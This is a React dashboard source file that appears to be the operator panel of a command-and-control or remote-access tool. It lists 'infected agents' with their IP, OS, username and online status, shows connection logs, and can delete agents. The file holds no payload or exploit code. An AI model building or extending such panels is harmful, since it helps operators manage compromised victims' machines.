import StatCard from "../../components/ui/StatsCard";
import InfectedAgentsTable from "./components/InfectedAgentsTable";
import SystemLogsCard from "./components/SystemLogsCard";
import { useAuth } from "../../contexts/AuthContext";
import { useNavigate } from "react-router";
import { useEffect, useState } from "react";
import { fetchJson } from "../../lib/api";

export default function Dashboard() {
  const { setIsAuthenticated } = useAuth();
  const navigate = useNavigate();

  const [stats, setStats] = useState([
    { title: "Active Agents", value: 0 },
    { title: "Online Agents", value: 0 },
    { title: "OS Types", value: 0 },
  ]);

  const [rows, setRows] = useState<any[]>([]);
  const [logs, setLogs] = useState<string[]>([]);

  const fetchData = async () => {
    try {
      const data: any = await fetchJson('/api/clients/display');
      if (data) {
        setStats([
          { title: "Active Agents", value: data.total_clients || 0 },
          { title: "Online Agents", value: data.online_clients_count || 0 },
          { title: "OS Types", value: data.os_types_count || 0 },
        ]);

        if (Array.isArray(data.clients)) {
          const mappedRows = data.clients.map((client: any, i: number) => ({
            id: i + 1,
            AgentID: client.id || "Unknown",
            IP: client.ip || "Unknown",
            OS: client.os || "Unknown",
            User: client.username || "Unknown",
            Status: client.is_online ? "Online" : "Offline"
          }));
          setRows(mappedRows);
        }
      }

      const logData: any = await fetchJson('/api/logs');
      if (logData && Array.isArray(logData)) {
        const filtered = logData.filter((log: any) =>
          log.event_type === 'CLIENT_CONNECT' ||
          log.event_type === 'CLIENT_DISCONNECT' ||
          log.event_type === 'SESSION_CREATE'
        );

        const formattedLogs = filtered.slice(0, 15).map((log: any) => {
          const time = new Date(log.created_at).toLocaleTimeString();
          if (log.event_type === 'SESSION_CREATE') {
            return `[${time}] User ${log.username || 'unknown'} logged in`;
          }
          if (log.event_type === 'CLIENT_CONNECT') {
            const shortId = log.client_id ? log.client_id.substring(0, 8) : 'Unknown';
            return `[${time}] Agent ${shortId} connected`;
          }
          if (log.event_type === 'CLIENT_DISCONNECT') {
            const shortId = log.client_id ? log.client_id.substring(0, 8) : 'Unknown';
            return `[${time}] Agent ${shortId} disconnected`;
          }
          return `[${time}] ${log.event_type}`;
        });

        setLogs(formattedLogs);
      }
    } catch (e) {
      console.error(e);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleDeleteAgent = async (agentId: string) => {
    if (!confirm('Are you sure you want to delete this agent?')) return;
    try {
      await fetchJson(`/api/clients/${agentId}`, { method: 'DELETE' });
      fetchData();
    } catch (e) {
      console.error("Failed to delete agent", e);
    }
  };

  const handleLogout = () => {
    // Basic logout logic: Delete local cookie state and redirect.
    document.cookie = "session_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    setIsAuthenticated(false);
    navigate("/login");
  };



  return (
    <div className="flex flex-col px-8 py-6 ">
      <div className="flex flex-col md:flex-row w-full border-b border-green md:justify-between items-start md:items-end pb-7 gap-4">
        <h1 className="text-2xl font-semibold text-green leading-none">
          Dashboard Overview <span className="inline-block w-2 h-2 rounded-full bg-green ml-1 animate-pulse mb-1" />
        </h1>
        <button
          onClick={handleLogout}
          className="px-6 py-2 border border-green text-green hover:bg-green hover:text-black transition-colors rounded uppercase tracking-wider text-sm font-semibold"
        >
          Disconnect
        </button>
      </div>
      {/* Stats Card */}
      <div className="mt-9 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
        {stats.map((item) => (
          <StatCard key={item.title} title={item.title} value={item.value} />
        ))}
      </div>
      <div className="mt-6 grid grid-cols-1 xl:grid-cols-3 gap-5">
        <InfectedAgentsTable rows={rows} onDelete={handleDeleteAgent} />
        <SystemLogsCard logs={logs} />
      </div>
    </div>
  );
}
